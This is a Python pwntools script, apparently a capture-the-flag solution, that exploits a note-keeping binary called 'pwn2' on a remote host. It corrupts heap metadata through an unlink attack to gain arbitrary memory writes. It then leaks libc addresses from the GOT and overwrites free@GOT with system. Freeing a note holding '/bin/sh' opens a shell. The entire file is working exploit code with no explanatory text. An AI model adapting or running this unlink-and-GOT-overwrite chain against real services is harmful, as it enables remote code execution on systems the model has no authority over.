#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2017-04-07 19:09:17
# @Author  : WinterSun (511683586@qq.com)
# @Link    : https://Winter3un.github.io/
import roputils
from pwn import *
context(log_level="debug")
DEBUG = 0

if DEBUG:
	p = process('./pwn2')
	# gdb.attach(p,"b*0x0400A6D\nc")
else:
	p = remote("120.27.248.138",12345)

def sd(data):
	p.sendline(data)
def ru(data):
	return p.recvuntil(data)


def add(index,length,data):
	ru("the action:")
	sd("1")
	ru("note index:\n")
	sd(str(index))
	ru(" of the new note:\n")
	sd(str(length))
	ru("ts of note:")
	sd(data)

def dele(index):
	ru("the action:")
	sd("2")
	ru("ter the note index:")
	sd(str(index))

def edit(index,length,data):
	ru("the action:")
	sd("3")
	ru(" note index:")
	sd(str(index))
	ru(" new note:")
	sd(str(length))
	ru("of note:\n")
	sd(data)
def show(index):
	ru("the action:")
	sd("4")
	ru(" note index:")
	sd(str(index))
def edit_anyaddr(addr,data):
	payload = '\x00'*0x18+p64(0x6020a8)+p64(0)+p64(addr)
	edit(0,len(payload),payload)
	edit(2,len(data),data)

add(0,512,"aaa")
add(1,512,"aaa")
add(2,512,"aaa")
add(3,512,"/bin/sh\x00")
head = p64(0)+p64(1+512)
fd = p64(0x6020C0 - 0x18)
bk = p64(0x6020C0 - 0x10)
payload =  head+fd+bk
payload += "a"*(512-len(payload))
payload += p64(512)+p64(512+0x10)
payload += "a"*(600-len(payload))
edit(0,600,payload)
dele(1)

rop = roputils.ROP("./pwn2")
read_got = rop.got('read')
free_got = rop.got('free')

# free_got = 0x602018
edit_anyaddr(0x6020C0+0x20,p64(free_got))
show(4)
free_addr = u64(ru("\n")[:-1].ljust(8,"\x00"))

edit_anyaddr(0x6020C0+0x20,p64(read_got))
show(4)
read_addr = u64(ru("\n")[:-1].ljust(8,"\x00"))
print "free_addr="+hex(free_addr)
print "read_addr="+hex(read_addr)

offset = 0x83940-0x45390
system_addr = free_addr - offset
edit_anyaddr(0x602018,p64(system_addr))
dele(3)

# def leak(addr):
# 	edit_anyaddr(0x6020C0+0x20,p64(addr))
# 	show(4)
	
# 	data = ru("\n")
# 	if len(data) ==1:
# 		return "\x00"
# 	else:
# 		return data[:-1]
# 	# log.debug("%#x => %s" % (addr, (data or '').encode('hex')))
# main = 0x400816
# d = DynELF(leak,main)
# d.lookup('system', 'libc')
p.interactive()